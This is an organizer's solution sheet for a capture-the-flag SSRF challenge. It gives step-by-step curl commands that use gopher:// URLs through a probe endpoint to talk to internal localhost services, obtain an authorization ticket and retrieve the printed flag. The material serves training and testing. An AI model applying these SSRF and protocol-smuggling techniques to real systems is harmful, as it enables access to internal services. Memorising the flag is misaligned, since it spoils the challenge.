# Organizer Solution & Protocol Specification: X05 — The Black Mirror

## Challenge Identity
- **ID:** X05
- **Name:** The Black Mirror
- **Category:** SSRF / Internal Protocol / Service Discovery
- **Difficulty:** Expert / Bonus
- **External Interface:** TCP/80 (Web UI & SSRF Probe API)
- **Flag:** `YUVA{ssrf_pr0t0c0l_f1ng3rpr1nt_bl4ck_m1rr0r_x05}`

---

## Vulnerability & Exploit Mechanism

### 1. SSRF Entry Point
The public gateway exposes an SSRF reflection probe at `POST /api/probe` that accepts URLs using `http://`, `https://`, and `gopher://` schemes.

```bash
curl -s -X POST http://<TARGET>:80/api/probe \
     -H "Content-Type: application/json" \
     -d '{"url": "http://127.0.0.1:8088/api/v1/vault"}'
```

### 2. Internal Service Discovery
Querying `/api/discovery` or performing port probing reveals:
- `127.0.0.1:9099`: Custom reflection daemon (SRP/1.0)
- `127.0.0.1:8088`: Stage-2 Sovereign Vault controller
- `127.0.0.1:8089`: Isolated Sovereign Flag Vault

### 3. Protocol Fingerprinting
Connecting to `127.0.0.1:9099` with HTTP results in:
```text
-ERR PROTOCOL_ERROR: HTTP framing detected. HTTP is not supported on port 9099.
-ERR HINT: Sovereign Reflection Protocol (SRP/1.0) required. Send 'HELP' or 'STATUS'.
```

Sending `HELP` via Gopher SSRF (`gopher://127.0.0.1:9099/_HELP%0D%0A`):
```text
+OK SRP/1.0 COMMANDS:
  STATUS                           - Query mirror node state and vault gateway
  NONCE                            - Issue reflection session nonce
  MIRROR <nonce> <node_id>         - Generate stage-2 vault authorization ticket
  PING                             - Heartbeat probe
  QUIT                             - Disconnect
```

### 4. Minimal Protocol Interaction
1. **Fetch Node ID and Gateway:**
   ```bash
   curl -s -X POST http://<TARGET>:80/api/probe \
        -H "Content-Type: application/json" \
        -d '{"url": "gopher://127.0.0.1:9099/_STATUS%0D%0A"}'
   ```
   *Response:* `+OK STATUS: NODE=NODE-4143 ... VAULT_GATEWAY=http://127.0.0.1:8088/api/v1/vault/unlock`

2. **Acquire Session Nonce:**
   ```bash
   curl -s -X POST http://<TARGET>:80/api/probe \
        -H "Content-Type: application/json" \
        -d '{"url": "gopher://127.0.0.1:9099/_NONCE%0D%0A"}'
   ```
   *Response:* `+OK NONCE: 9f8a3c7e6d1b4028`

3. **Derive Stage-2 Ticket:**
   ```bash
   curl -s -X POST http://<TARGET>:80/api/probe \
        -H "Content-Type: application/json" \
        -d '{"url": "gopher://127.0.0.1:9099/_MIRROR%209f8a3c7e6d1b4028%20NODE-4143%0D%0A"}'
   ```
   *Response:* `+OK MIRROR_AUTH_TICKET: SRP_AUTH_9F8A3C7E6D1B4028_NODE4143_...`

### 5. Next Stage Transition & Flag Retrieval
Submit the ticket to the Vault Controller via SSRF POST:
```bash
curl -s -X POST http://<TARGET>:80/api/probe \
     -H "Content-Type: application/json" \
     -d '{
       "url": "http://127.0.0.1:8088/api/v1/vault/unlock",
       "method": "POST",
       "data": "{\"ticket\": \"SRP_AUTH_9F8A3C7E6D1B4028_NODE4143_...\"}",
       "headers": {"Content-Type": "application/json"}
     }'
```

*Response:*
```json
{
  "status": "AUTHORIZATION_GRANTED",
  "message": "Black Mirror core resonance synchronized. Sovereign Citadel vault unlocked.",
  "stage": "STAGE_2_COMPLETE",
  "flag": "YUVA{ssrf_pr0t0c0l_f1ng3rpr1nt_bl4ck_m1rr0r_x05}"
}
```

---

## Network Isolation & Boundary Verification
- Cloud metadata (`169.254.169.254`) and Kubernetes API (`10.96.0.1`, port 6443) are blocked at the application level.
- Kubernetes `NetworkPolicy` enforces default-deny ingress and egress.
- Only TCP/80 is exposed publicly.
